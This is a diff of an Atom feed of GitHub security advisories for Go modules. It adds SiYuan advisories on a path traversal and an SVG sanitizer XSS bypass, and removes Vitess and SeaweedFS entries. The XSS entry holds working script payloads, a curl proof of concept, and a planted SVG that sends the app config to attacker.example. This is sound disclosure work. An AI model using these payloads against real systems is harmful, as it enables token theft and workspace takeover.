@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-09-03T13:35:50.276Z</updated>
+    <updated>2026-09-03T17:10:00.514Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,163 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: path traversal via /export/temp/ short-circuit branch (incomplete fix for the export-disclosure hardening, GHSA-6865-qjcf-286f)]]></title>
+        <id>https://github.com/advisories/GHSA-gw25-m53r-qh88</id>
+        <link href="https://github.com/advisories/GHSA-gw25-m53r-qh88"/>
+        <updated>2026-09-03T14:56:34.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>SiYuan's <code>/export/</code> file handler was hardened against export disclosure (issue #12213) by adding an
+<code>IsSubPath(exportBaseDir, fullPath)</code> check and an <code>IsSensitivePath()</code> check in commit <code>bb481e1</code>. These guards
+were added only to the main branch of the handler. The handler begins with a short-circuit branch:</p>
+<pre><code class="language-go">if strings.HasPrefix(c.Request.URL.Path, "/export/temp/") {
+    c.File(filepath.Join(util.TempDir, c.Request.URL.Path))
+    return
+}
+</code></pre>
+<p>This branch joins the <strong>broader</strong> <code>util.TempDir</code> with the raw, percent-decoded request path and serves it with
+<strong>neither</strong> <code>IsSubPath</code> <strong>nor</strong> <code>IsSensitivePath</code>. An authenticated request to
+<code>/export/temp/%2e%2e/.../etc/passwd</code> traverses out of <code>TempDir</code> and reads arbitrary files - exactly the
+sensitive-file disclosure the patch intended to prevent. Present in the latest master.</p>
+<h2 id="affected">Affected</h2>
+<ul>
+<li>From commit <code>bb481e1</code> (the hardening) through the latest master.</li>
+<li>Requires SiYuan access authorization (<code>model.CheckAuth</code>) - but the patch's stated goal is to deny sensitive-file
+export even to authorized callers.</li>
+</ul>
+<h2 id="root-cause">Root cause</h2>
+<p><code>kernel/server/serve.go</code> <code>serveExport()</code>: the main branch has <code>IsSubPath</code> + <code>IsSensitivePath</code>; the
+<code>/export/temp/</code> short-circuit branch (above it) has neither and uses <code>util.TempDir</code> as its root.
+<code>c.Request.URL.Path</code> is percent-decoded by net/http, so <code>%2e%2e</code> becomes <code>..</code> and <code>filepath.Join</code> collapses it.</p>
+<h2 id="incomplete-fix-lineage">Incomplete-fix lineage</h2>
+<ul>
+<li>Export disclosure (issue #12213; CVE-2026-30869) -&gt; fix <code>bb481e1</code> / <code>d68bd5a</code> (GHSA-6865-qjcf-286f): guards on
+the main branch + <code>IsSensitivePath</code> extended to <code>*.db</code>/<code>*.log</code>.</li>
+<li>Follow-up CVE-2026-41894 (GHSA-hjh7-r5w8-5872) in the same <code>/export</code> path family.</li>
+<li>The <code>/export/temp/</code> short-circuit branch was never covered by the guards (this report).</li>
+</ul>
+<h2 id="proof-of-concept-benign">Proof of concept (benign)</h2>
+<ol>
+<li>Authenticate (access auth code).</li>
+<li><code>GET /export/&lt;sensitive&gt;</code> (main branch) -&gt; 401/403 (guards work).</li>
+<li><code>GET /export/temp/%2e%2e/%2e%2e/.../tmp/&lt;planted-marker&gt;</code> (or <code>/etc/hostname</code>) -&gt; 200 + file content,
+demonstrating the unguarded traversal. The PoC reads only a planted marker / <code>/etc/hostname</code>; no credentials.</li>
+</ol>
+<h2 id="impact">Impact</h2>
+<p>Authenticated arbitrary file read bypassing the sensitive-file protection: <code>/etc/passwd</code>, <code>~/.ssh/*</code>, SiYuan
+<code>*.db</code> workspace data, <code>*.log</code>. </p>
+<h2 id="remediation">Remediation</h2>
+<ul>
+<li>Apply <code>IsSubPath</code> + <code>IsSensitivePath</code> to the <code>/export/temp/</code> branch (or restrict its root to <code>TempDir/temp</code> with
+an <code>IsSubPath</code> check).</li>
+<li><code>filepath.Clean</code> the request path and reject <code>..</code>.</li>
+<li>Merge both branches into one guarded file-serving function.</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li>Hardening advisory: <a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-6865-qjcf-286f">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-6865-qjcf-286f</a> (commit d68bd5a); issue #12213.</li>
+<li>CVE chain: CVE-2026-30869 -&gt; CVE-2026-41894 (GHSA-hjh7-r5w8-5872).</li>
+<li>serve.go guards commit: <a href="https://github.com/siyuan-note/siyuan/commit/bb481e1290c4a34255652ede85a546504505d2a7">https://github.com/siyuan-note/siyuan/commit/bb481e1290c4a34255652ede85a546504505d2a7</a></li>
+<li>Residual source (master): <code>kernel/server/serve.go</code> <code>serveExport()</code> lines 308-312.</li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-gw25-m53r-qh88">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-gw25-m53r-qh88</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/commit/b763d787d1f2b862c577049e4ee147c5857fe413">https://github.com/siyuan-note/siyuan/commit/b763d787d1f2b862c577049e4ee147c5857fe413</a></li>
+<li><a href="https://github.com/advisories/GHSA-gw25-m53r-qh88">https://github.com/advisories/GHSA-gw25-m53r-qh88</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gw25-m53r-qh88</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-03T14:56:31.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: Stored and reflected XSS in SiYuan through an SVG sanitizer bypass]]></title>
+        <id>https://github.com/advisories/GHSA-99rq-75j6-5j9f</id>
+        <link href="https://github.com/advisories/GHSA-99rq-75j6-5j9f"/>
+        <updated>2026-09-03T14:53:18.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>SiYuan cleans user supplied SVG with <code>util.SanitizeSVG</code> before it serves the file inline as <code>image/svg+xml</code>. This cleaner is the guard behind the <code>Editor.AllowSVGScript</code> setting, which is off by default, so a <code>&lt;script&gt;</code> inside an SVG is meant to be removed.</p>
+<p>The cleaner reads the input as HTML, but the browser reads the served file as XML (SVG). Because the two parsers treat some tags differently, a <code>&lt;script&gt;</code> can be hidden so the cleaner never removes it. The cleaned file still holds a working script. When a browser opens that file as an SVG document, the script runs in the app origin. There is no Content Security Policy in the product to stop it.</p>
+<p>The same bug can be reached in two ways. Both share one root cause (the cleaner), so one fix in the cleaner closes both:</p>
+<ul>
+<li>Reflected, through a single link: <code>GET /api/icon/getDynamicIcon</code></li>
+<li>Stored, through a planted <code>.svg</code> asset: <code>GET /assets/&lt;name&gt;.svg</code></li>
+</ul>
+<p>I confirmed this on a live SiYuan 3.7.2 kernel.</p>
+<h2 id="root-cause">Root cause</h2>
+<p><code>util.SanitizeSVG</code> (<code>kernel/util/misc.go:319</code>) parses the string with an HTML parser, walks the element nodes to drop <code>&lt;script&gt;</code>, <code>&lt;iframe&gt;</code>, <code>&lt;foreignobject&gt;</code>, event handler attributes and so on, then renders it back and cuts out the <code>&lt;svg&gt;...&lt;/svg&gt;</code> part.</p>
+<p>The gap comes from HTML parsing rules that do not exist in XML:</p>
+<ul>
+<li><code>&lt;desc&gt;</code> and <code>&lt;title&gt;</code> are HTML integration points. Inside them the HTML parser switches back to normal HTML mode. The cleaner drops <code>&lt;foreignObject&gt;</code> but keeps <code>&lt;desc&gt;</code> and <code>&lt;title&gt;</code>.</li>
+<li>Inside HTML mode, <code>&lt;style&gt;</code>, <code>&lt;xmp&gt;</code> and <code>&lt;noscript&gt;</code> are raw text elements. Their contents are read as plain text, not as child nodes. So the cleaner never sees a <code>&lt;script&gt;</code> placed inside them, and the render step writes it back exactly as it was.</li>
+<li>When the browser reads the same bytes as XML (SVG), there is no raw text rule. <code>&lt;style&gt;</code> becomes a normal container and the hidden <code>&lt;script&gt;</code> becomes a real, working SVG script node.</li>
+</ul>
+<p>I checked this by building and running the real <code>SanitizeSVG</code>. A plain <code>&lt;script&gt;</code> under <code>&lt;svg&gt;</code> is removed, but wrapping it in <code>&lt;desc&gt;&lt;style&gt;</code> lets it pass through untouched:</p>
+<pre><code>IN : &lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;
+OUT: &lt;svg&gt;&lt;/svg&gt;                                                     (removed)
+
+IN : &lt;svg&gt;&lt;desc&gt;&lt;style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/style&gt;&lt;/desc&gt;&lt;/svg&gt;
+OUT: &lt;svg&gt;&lt;desc&gt;&lt;style&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/style&gt;&lt;/desc&gt;&lt;/svg&gt;   (kept, runs)
+</code></pre>
+<p>Two places serve SVG through this cleaner, and both only require <code>CheckAuth</code>, which allows Administrator, Editor and Reader roles:</p>
+<ul>
+<li><code>kernel/server/serve.go:703</code> <code>serveSVG</code> serves an asset inline as <code>image/svg+xml</code>.</li>
+<li><code>kernel/api/icon.go:158</code> <code>getDynamicIcon</code>. For <code>type=8</code> the <code>content</code> query value is put straight into the SVG template at <code>icon.go:583</code> with no escaping, then cleaned, then served as <code>image/svg+xml</code>.</li>
+</ul>
+<h2 id="attack-vector-1-reflected-one-link">Attack vector 1: reflected (one link)</h2>
+<p>The <code>content</code> value in <code>getDynamicIcon</code> is reflected as is and survives the cleaner. A signed in user only has to open one link.</p>
+<pre><code>curl -sk -G 'http://127.0.0.1:6806/api/icon/getDynamicIcon' \
+  --data-urlencode 'type=8' \
+  --data-urlencode 'content=&lt;/text&gt;&lt;desc&gt;&lt;style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/style&gt;&lt;/desc&gt;&lt;text&gt;'
+</code></pre>
+<p>The response is <code>HTTP/1.1 200 OK</code>, <code>Content-Type: image/svg+xml</code>, and the body holds a live script:</p>
+<pre><code class="language-xml">&lt;text ...&gt;&lt;/text&gt;&lt;desc&gt;&lt;style&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;&lt;/style&gt;&lt;/desc&gt;&lt;text&gt;&lt;/text&gt;
+</code></pre>
+<p>Open this in a browser as a signed in user (or on an instance with no lock screen code) to see it run:</p>
+<pre><code>http://&lt;host&gt;:6806/api/icon/getDynamicIcon?type=8&amp;content=%3C%2Ftext%3E%3Cdesc%3E%3Cstyle%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3C%2Fstyle%3E%3C%2Fdesc%3E%3Ctext%3E
+</code></pre>
+<h2 id="attack-vector-2-stored-planted-asset">Attack vector 2: stored (planted asset)</h2>
+<p>Place this file as <code>data/assets/evil.svg</code>:</p>
+<pre><code class="language-xml">&lt;svg xmlns="http://www.w3.org/2000/svg"&gt;&lt;desc&gt;&lt;style&gt;&lt;script&gt;
+fetch('/api/system/getConf',{method:'POST'}).then(r=&gt;r.text())
+  .then(t=&gt;{new Image().src='https://attacker.example/?'+encodeURIComponent(t)});
+&lt;/script&gt;&lt;/style&gt;&lt;/desc&gt;&lt;/svg&gt;
+</code></pre>
+<p>Then open <code>/assets/evil.svg</code>. The script runs. The asset can arrive by admin upload, or by a lower trust path such as an imported template, a <code>.sy.zip</code>, or a synced asset that carries a booby trapped SVG.</p>
+<p>Note for both vectors: an SVG script runs on direct navigation, <code>&lt;iframe&gt;</code>, <code>&lt;embed&gt;</code> or <code>&lt;object&gt;</code>. It does not run when the SVG is loaded through an <code>&lt;img&gt;</code> tag, so open the link directly or embed it in a frame.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li>A note or asset made by one user can run any JavaScript in another user's browser on the publish site. This is the publishing threat model.</li>
+<li>Script in the app origin can call the signed in kernel API, so it can read and write notes and files, read the config, and steal the API token. In the desktop app origin this means full workspace takeover.</li>
+<li>The default <code>AllowSVGScript=false</code> exists to stop SVG scripts, and this bypass removes that protection. There is no CSP as a backup.</li>
+</ul>
+<h2 id="suggested-fix">Suggested fix</h2>
+<ul>
+<li>Do not use an HTML parse and re render cleaner for content that the browser reads as XML or SVG. Clean it as XML, or use a trusted SVG cleaner, and also drop <code>&lt;desc&gt;</code>, <code>&lt;title&gt;</code> and <code>&lt;foreignObject&gt;</code> and any raw text smuggled markup.</li>
+<li>Serve user SVG with <code>Content-Disposition: attachment</code> and a non running content type, and add a strict <code>script-src</code> CSP on <code>/assets/*</code> and <code>/api/icon/getDynamicIcon</code>.</li>
+<li>Escape the reflected <code>content</code> value in <code>getDynamicIcon</code> before it goes into the template.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/siyuan-note/siyuan/security/advisories/GHSA-99rq-75j6-5j9f">https://github.com/siyuan-note/siyuan/security/advisories/GHSA-99rq-75j6-5j9f</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/commit/f08dee71ba8e087a395d74f121de11e6a997ef14">https://github.com/siyuan-note/siyuan/commit/f08dee71ba8e087a395d74f121de11e6a997ef14</a></li>
+<li><a href="https://github.com/siyuan-note/siyuan/releases/tag/v3.7.3">https://github.com/siyuan-note/siyuan/releases/tag/v3.7.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-99rq-75j6-5j9f">https://github.com/advisories/GHSA-99rq-75j6-5j9f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-99rq-75j6-5j9f</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-03T14:53:17.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/openchoreo/openchoreo] OpenChoreo: Authenticated OS command injection via OpenChoreo Workflow Plane templates enables code execution in privileged pods]]></title>
         <id>https://github.com/advisories/GHSA-2mw5-23gm-pccq</id>
@@ -1957,119 +2114,5 @@ GET /debug/vrlog under deny-all =&gt; status=200 body="ROWCHANGE Event\tINSERT I
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-08-18T20:50:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[vitess.io/vitess] Vitess: Missing authorization on vttablet /debug/vrlog exposes live VReplication SQL data]]></title>
-        <id>https://github.com/advisories/GHSA-mhc4-g3wh-cw7m</id>
-        <link href="https://github.com/advisories/GHSA-mhc4-g3wh-cw7m"/>
-        <updated>2026-09-02T15:26:56.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="vulnerability-details">Vulnerability Details</h2>
-<p><strong>File</strong>: <code>go/vt/vttablet/tabletmanager/vreplication/vrlog.go</code></p>
-<h3 id="summary">Summary</h3>
-<p><code>vttablet</code>'s <code>/debug/vrlog</code> HTTP endpoint streams live VReplication event data — including the literal SQL DML statements being replicated by MoveTables, Reshard, Materialize, and "vitess"-strategy Online DDL workflows — with no authorization check at all. Every comparable "debugging" HTTP endpoint in vttablet/vtgate (querylogz, queryz, txlogz, livequeryz, schemaz, debugenv, hotrows, tablet_plans, query_stats, query_rules) calls <code>acl.CheckAccessHTTP(r, acl.DEBUGGING)</code> before serving data, so that the cluster operator's configured <code>--security-policy</code> (e.g. <code>deny-all</code>, <code>read-only</code>, or a custom plugin) is actually honored. <code>vrlog.go</code> is the one exception: it has zero references to the <code>acl</code> package.</p>
-<h3 id="root-cause">Root Cause</h3>
-<p><code>addHttpEndpoint()</code> registers <code>/debug/vrlog</code> via <code>servenv.HTTPHandleFunc</code>, and <code>vrlogStatsHandler()</code> immediately starts streaming subscribed <code>VrLogStats</code> events to the response writer without first calling <code>acl.CheckAccessHTTP(r, acl.DEBUGGING)</code>, unlike every sibling handler in the same family (see e.g. <code>go/vt/vttablet/tabletserver/querylogz.go</code>'s <code>querylogzHandler</code>, which calls the check first).</p>
-<p>The data streamed is sensitive: <code>go/vt/vttablet/tabletmanager/vreplication/vplayer.go</code> calls <code>NewVrLogStats(...).Send(sql)</code> / <code>.Send(event.Statement)</code> for every row change and statement event flowing through a VReplication stream (vplayer.go:339, 700, 771, 785) — i.e. the literal SQL (including bound data values) being copied/replicated by MoveTables, Reshard, Materialize, and Online DDL.</p>
-<h3 id="attack-scenario">Attack Scenario</h3>
-<ol>
-<li>A cluster operator configures <code>--security-policy=deny-all</code> (or <code>read-only</code>, or a custom policy) specifically to lock down debugging/admin HTTP endpoints on vttablet, relying on this being uniformly enforced.</li>
-<li>An attacker who can reach the vttablet debug HTTP port (common in Kubernetes/Prometheus-scraping deployments where this port is exposed beyond localhost) — but who does NOT have the <code>DEBUGGING</code>/admin role the policy requires — sends <code>GET /debug/vrlog</code>.</li>
-<li>Every other debug endpoint correctly returns <code>403 Forbidden</code>. <code>/debug/vrlog</code> returns <code>200 OK</code> and streams live VReplication event data, including raw SQL DML statements containing application data values, for as long as the attacker keeps the connection open (bounded by <code>timeout</code>/<code>limit</code> query params, repeatable).</li>
-</ol>
-<h3 id="impact">Impact</h3>
-<p>Confidentiality impact: disclosure of live replicated application data (potentially including PII or other sensitive column values) to an unauthorized actor, bypassing an access control the operator explicitly configured. No write/modify capability; this is a read-only information-disclosure / access-control-bypass issue, scoped to the vttablet debug HTTP listener.</p>
-<h3 id="vulnerable-code">Vulnerable Code</h3>
-<pre><code class="language-go">// go/vt/vttablet/tabletmanager/vreplication/vrlog.go
-func addHttpEndpoint() {
-    servenv.HTTPHandleFunc("/debug/vrlog", func(w http.ResponseWriter, r *http.Request) {
-        ch := vrLogStatsLogger.Subscribe("vrlogstats")
-        defer vrLogStatsLogger.Unsubscribe(ch)
-        vrlogStatsHandler(ch, w, r)
-    })
-}
-
-func vrlogStatsHandler(ch chan *VrLogStats, w http.ResponseWriter, r *http.Request) {
-    timeout, limit := parseTimeoutLimitParams(r)
-    // no acl.CheckAccessHTTP(r, acl.DEBUGGING) call anywhere in this file
-    ...
-</code></pre>
-<h3 id="recommended-fix">Recommended Fix</h3>
-<pre><code class="language-go">import "vitess.io/vitess/go/acl"
-
-func vrlogStatsHandler(ch chan *VrLogStats, w http.ResponseWriter, r *http.Request) {
-    if err := acl.CheckAccessHTTP(r, acl.DEBUGGING); err != nil {
-        acl.SendError(w, err)
-        return
-    }
-    timeout, limit := parseTimeoutLimitParams(r)
-    ...
-</code></pre>
-<p>This mirrors the exact pattern already used by <code>querylogz.go</code>, <code>queryz.go</code>, <code>txlogz.go</code>, <code>livequeryz.go</code>, <code>schemaz.go</code>, <code>debugenv.go</code>, and <code>tx_serializer.go</code> (hotrows) in the same codebase.</p>
-<h3 id="verification">Verification</h3>
-<p>Built v24.0.1 from source and wrote a standalone Go test that: (1) activates the real <code>deny-all</code> security policy via <code>acl.RegisterFlags</code>, (2) registers <code>/debug/vrlog</code> via the real, unmodified <code>vreplication.NewVrLogStats(...)</code> call path (the same one <code>vplayer.go</code> uses for live replication traffic), (3) serves the real <code>servenv</code> HTTP mux on a loopback listener, and (4) issues a real <code>GET /debug/vrlog</code> while emitting a simulated replicated statement.</p>
-<p>Result:</p>
-<pre><code>acl.CheckAccessHTTP(DEBUGGING) under deny-all =&gt; err=not allowed: deny-all security-policy enforced
-GET /debug/vrlog under deny-all =&gt; status=200 body="ROWCHANGE Event\tINSERT INTO secret_table (ssn) VALUES ('leaked-via-vrlog')\t2026-06-22T11:01:55\t147101\n"
-</code></pre>
-<p>The identical ACL check that protects every sibling endpoint correctly rejected the request, while <code>/debug/vrlog</code> returned 200 and streamed the simulated sensitive content — confirming the bypass against real, unmodified v24.0.1 code.</p>
-<p>Also confirmed via the GitHub Contents API that <code>vrlog.go</code> has zero references to the <code>acl</code> package on <code>main</code>, <code>release-23.0</code>, and <code>release-22.0</code> as well, so all currently supported release lines appear affected.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/vitessio/vitess/security/advisories/GHSA-mhc4-g3wh-cw7m">https://github.com/vitessio/vitess/security/advisories/GHSA-mhc4-g3wh-cw7m</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-65959">https://nvd.nist.gov/vuln/detail/CVE-2026-65959</a></li>
-<li><a href="https://github.com/vitessio/vitess/pull/20467">https://github.com/vitessio/vitess/pull/20467</a></li>
-<li><a href="https://github.com/vitessio/vitess/commit/4c58cd70edc6b03d61cb65842c342ac08341e64f">https://github.com/vitessio/vitess/commit/4c58cd70edc6b03d61cb65842c342ac08341e64f</a></li>
-<li><a href="https://github.com/vitessio/vitess/commit/657662e78bde1c82df680e9cc43a686d619f8094">https://github.com/vitessio/vitess/commit/657662e78bde1c82df680e9cc43a686d619f8094</a></li>
-<li><a href="https://github.com/vitessio/vitess/commit/d929225a450027406687d27af8dca45620945ceb">https://github.com/vitessio/vitess/commit/d929225a450027406687d27af8dca45620945ceb</a></li>
-<li><a href="https://github.com/advisories/GHSA-mhc4-g3wh-cw7m">https://github.com/advisories/GHSA-mhc4-g3wh-cw7m</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-mhc4-g3wh-cw7m</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-08-18T20:50:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/seaweedfs/seaweedfs] SeaweedFS: Unauthenticated filer IAM gRPC service grants S3 administrative control]]></title>
-        <id>https://github.com/advisories/GHSA-2v6v-25fm-p4fg</id>
-        <link href="https://github.com/advisories/GHSA-2v6v-25fm-p4fg"/>
-        <updated>2026-09-02T14:51:59.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
-<p>The filer registered the IAM gRPC service (<code>SeaweedIdentityAccessManagement</code>) with no authentication. Any client able to reach the filer gRPC port could invoke IAM RPCs — <code>CreateUser</code>, <code>CreateAccessKey</code>, <code>PutUserPolicy</code>, and related calls — to mint credentials and grant itself S3 administrative privileges. This fully compromises the confidentiality, integrity, and availability of stored objects.</p>
-<p>No credentials are required, and enabling the documented JWT signing keys does not close it: the IAM gRPC service was not gated by that mechanism. Even under mTLS, the listener-level <code>allowed_commonNames</code> ACL applies to the port rather than to individual RPCs, so any cluster mesh certificate could reach these administrative calls.</p>
-<h3 id="affected-component">Affected component</h3>
-<ul>
-<li><code>weed/server/filer_server_handlers_iam_grpc.go</code></li>
-<li><code>weed/command/filer.go</code></li>
-</ul>
-<h3 id="patches">Patches</h3>
-<p>Fixed in <strong>4.24</strong>. Every IAM RPC now requires a Bearer token signed with the filer admin signing key (<code>jwt.filer_signing.key</code>), and the service refuses to register when no signing key is configured — removing the unauthenticated default entirely.</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Restrict the filer gRPC port to trusted hosts. Configure <code>jwt.filer_signing.key</code> in <code>security.toml</code> and upgrade to 4.24; operators that use the IAM RPCs must attach an admin-signed Bearer token on each call.</p>
-<h3 id="references">References</h3>
-<ul>
-<li>Fixed by seaweedfs/seaweedfs#9442 (follow-ups: #9498, #9508, #9514, #9536)</li>
-<li>Reported by Kadir Arslan (<a href="https://github.com/KadirArslan">https://github.com/KadirArslan</a>)</li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-2v6v-25fm-p4fg">https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-2v6v-25fm-p4fg</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-72920">https://nvd.nist.gov/vuln/detail/CVE-2026-72920</a></li>
-<li><a href="https://github.com/seaweedfs/seaweedfs/pull/9442">https://github.com/seaweedfs/seaweedfs/pull/9442</a></li>
-<li><a href="https://github.com/seaweedfs/seaweedfs/commit/5e8f99f40a8abc7b449aefd260516443377041c7">https://github.com/seaweedfs/seaweedfs/commit/5e8f99f40a8abc7b449aefd260516443377041c7</a></li>
-<li><a href="https://github.com/seaweedfs/seaweedfs/releases/tag/4.24">https://github.com/seaweedfs/seaweedfs/releases/tag/4.24</a></li>
-<li><a href="https://github.com/advisories/GHSA-2v6v-25fm-p4fg">https://github.com/advisories/GHSA-2v6v-25fm-p4fg</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2v6v-25fm-p4fg</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-09-02T14:51:58.000Z</published>
     </entry>
 </feed>
